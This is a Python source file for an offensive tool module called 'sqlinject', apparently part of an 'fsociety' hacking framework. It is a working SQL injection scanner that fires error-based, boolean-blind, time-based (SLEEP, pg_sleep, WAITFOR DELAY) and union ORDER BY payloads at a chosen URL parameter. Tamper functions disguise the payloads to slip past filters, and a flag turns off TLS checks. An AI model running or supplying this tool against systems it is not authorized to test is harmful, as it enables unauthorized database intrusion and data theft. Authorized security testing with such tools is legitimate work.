from __future__ import annotations

import hashlib
import http.client
import json
import random
import re
import ssl
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log

SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark after the character string", "quoted string not properly terminated",
    "microsoft ole db provider for sql server", "postgresql.*error", "pg_query\(\)",
    "ora-\d{5}", "sqlite3\.OperationalError", "sqlite error", "syntax error at or near", "mariadb",
]

class Tamper:
    @staticmethod
    def none(payload: str) -> str: return payload
    @staticmethod
    def randomcase(payload: str) -> str: return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    @staticmethod
    def comment(payload: str) -> str: return re.sub(r"\s+", "/**/", payload)
    @staticmethod
    def urlencode(payload: str) -> str: return urllib.parse.quote(payload)

@tool("sqlinject", "Brutal SQL injection: Error, Boolean, Time, and Union", category="web")
class SqlInject:
    @staticmethod
    def build_parser(p):
        p.add_argument("url")
        p.add_argument("--param", required=True)
        p.add_argument("--method", default="GET", choices=["GET", "POST"])
        p.add_argument("--data", help="Base POST data (e.g., 'user=admin&pass=1')")
        p.add_argument("--delay", type=float, default=5.0, help="Time-based delay in seconds")
        p.add_argument("--threads", type=int, default=5)
        p.add_argument("--tamper", default="none", choices=["none", "randomcase", "comment", "urlencode"])
        p.add_argument("--insecure", action="store_true")
        p.add_argument("--timeout", type=float, default=10.0)
        p.add_argument("-o", "--out")

    @staticmethod
    def _ctx(insecure: bool):
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx

    @staticmethod
    def _request(url, method, param, payload, base_data, timeout, ctx, tamper_fn):
        payload = tamper_fn(payload)
        parsed = urllib.parse.urlparse(url)
        scheme = parsed.scheme or "http"
        host = parsed.hostname
        port = parsed.port or (443 if scheme == "https" else 80)
        path = parsed.path or "/"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        
        start = time.time()
        try:
            if method == "GET":
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [payload]
                query = urllib.parse.urlencode(qs, doseq=True)
                conn = (http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx) if scheme == "https" else http.client.HTTPConnection(host, port, timeout=timeout))
                conn.request("GET", f"{path}?{query}", headers=headers)
            else:
                data = urllib.parse.parse_qs(base_data or "", keep_blank_values=True)
                data[param] = [payload]
                body = urllib.parse.urlencode(data, doseq=True)
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                conn = (http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx) if scheme == "https" else http.client.HTTPConnection(host, port, timeout=timeout))
                conn.request("POST", path, body=body, headers=headers)
                
            resp = conn.getresponse()
            html = resp.read().decode("utf-8", "ignore")
            elapsed = time.time() - start
            conn.close()
            return html, elapsed
        except Exception as exc:
            return str(exc), time.time() - start

    @staticmethod
    def _check_error(html: str) -> bool:
        html_lower = html.lower()
        return any(re.search(err, html_lower) for err in SQL_ERRORS)

    @staticmethod
    def _test_boolean(url, method, param, base_data, timeout, ctx, tamper_fn, log):
        html_t, _ = SqlInject._request(url, method, param, "' AND '1'='1", base_data, timeout, ctx, tamper_fn)
        html_f, _ = SqlInject._request(url, method, param, "' AND '1'='2", base_data, timeout, ctx, tamper_fn)
        hash_t = hashlib.md5(html_t.encode()).hexdigest()
        hash_f = hashlib.md5(html_f.encode()).hexdigest()
        if hash_t != hash_f and len(html_t) != len(html_f):
            log.hit(f"Boolean-based blind confirmed. (True len: {len(html_t)} | False len: {len(html_f)})")
            return True
        return False

    @staticmethod
    def _test_time(url, method, param, base_data, delay, timeout, ctx, tamper_fn, log):
        payloads = [f"' AND SLEEP({delay})-- ", f"'; SELECT pg_sleep({delay})-- ", f"'; WAITFOR DELAY '0:0:{int(delay)}'-- "]
        for pl in payloads:
            _, elapsed = SqlInject._request(url, method, param, pl, base_data, timeout + delay, ctx, tamper_fn)
            if elapsed >= delay - 0.5:
                log.hit(f"Time-based blind confirmed via: {pl.strip()}")
                return True
        return False

    @staticmethod
    def _test_union(url, method, param, base_data, timeout, ctx, tamper_fn, log):
        for i in range(1, 15):
            payload = f"' ORDER BY {i}-- "
            html, _ = SqlInject._request(url, method, param, payload, base_data, timeout, ctx, tamper_fn)
            if SqlInject._check_error(html):
                cols = i - 1
                if cols > 0:
                    log.hit(f"Union-based injection confirmed. Column count: {cols}")
                    return True
                break
        return False

    @staticmethod
    def run(args, log: Log) -> int:
        tamper_fn = getattr(Tamper, args.tamper)
        ctx = SqlInject._ctx(args.insecure)
        found = False

        log.info(f"Starting SQLi probe on {args.url} (Param: {args.param}) | Tamper: {args.tamper}")
        
        for payload in ["'", "\"", "')", "';"]:
            html, _ = SqlInject._request(args.url, args.method, args.param, payload, args.data, args.timeout, ctx, tamper_fn)
            if SqlInject._check_error(html):
                log.hit(f"Error-based SQLi confirmed via payload: {payload}")
                found = True
                break
                
        if not found and SqlInject._test_boolean(args.url, args.method, args.param, args.data, args.timeout, ctx, tamper_fn, log):
            found = True
        if not found and SqlInject._test_time(args.url, args.method, args.param, args.data, args.delay, args.timeout, ctx, tamper_fn, log):
            found = True
        if not found and SqlInject._test_union(args.url, args.method, args.param, args.data, args.timeout, ctx, tamper_fn, log):
            found = True

        if found:
            log.ok("Target is vulnerable.")
            if args.out: Path(args.out).write_text(f"Vulnerable: {args.url}?{args.param}=\n")
        else:
            log.warn("No vulnerabilities detected.")
        return 0 if found else 1
